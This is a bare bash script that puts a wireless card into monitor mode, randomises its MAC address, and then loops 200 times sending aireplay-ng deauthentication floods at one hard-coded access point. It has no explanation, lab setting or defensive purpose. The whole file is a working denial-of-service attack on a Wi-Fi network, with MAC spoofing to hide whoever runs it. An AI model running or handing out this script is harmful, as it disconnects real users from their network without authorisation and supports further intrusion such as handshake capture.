#!/bin/bash

airmon-ng start wlan0 &
sleep 7s
ifconfig wlan0mon down &
sleep 1s
macchanger -r wlan0mon &
sleep 2s
ifconfig wlan0mon up &
airodump-ng wlan0mon -c 6

for i in {1..200}; do
    aireplay-ng --deauth 5 -a 4A:D9:E7:DD:CD:78 wlan0mon
    sleep 5s
done
airmon-ng stop wlan0mon &
sleep 2s
service network-manager restart
exit
